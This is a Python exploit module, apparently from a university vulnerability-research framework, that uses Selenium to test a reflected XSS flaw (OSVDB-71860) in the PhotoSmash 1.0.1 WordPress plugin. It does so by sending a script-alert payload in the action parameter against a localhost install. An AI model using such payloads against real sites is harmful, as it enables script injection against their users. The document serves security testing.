# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file. 

import framework
import time
from selenium.common.exceptions import NoAlertPresentException

class Exploit (framework.Exploit):

    attributes = {'Name' : "OSVDB_71860", 
		  'Description': "PhotoSmash Plugin for WordPress contains a flaw that allows a remote XSS attack",
		  'References' : [['OSVDB', '71860']],
		  'Target' : "Wordpress 3.2",
		  'TargetLicense' : '', 
		  'Plugin': "PhotoSmash 1.0.1",
		  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-71860",
		  'Type' : 'XSS'
		  }

    worked = False

    def __init__(self, visible=False):
	framework.Exploit.__init__(self, visible)
	return

    def exploit(self):
	driver = self.create_selenium_driver()
	driver.get("http://localhost/wordpress")
	self.logger.info("Page opened successfully: %s", driver.title)
        driver.get("http://127.0.0.1/wordpress/wp-content/plugins/photosmash-galleries/index.php?action=<script>alert(\"XSS\")</script>")
        try:
            driver.get_alert()
            self.worked = True
        except NoAlertPresentException:
            self.worked = False
        time.sleep(4)
        driver.cleanup()
        return
    
    def verify(self):
        return self.worked

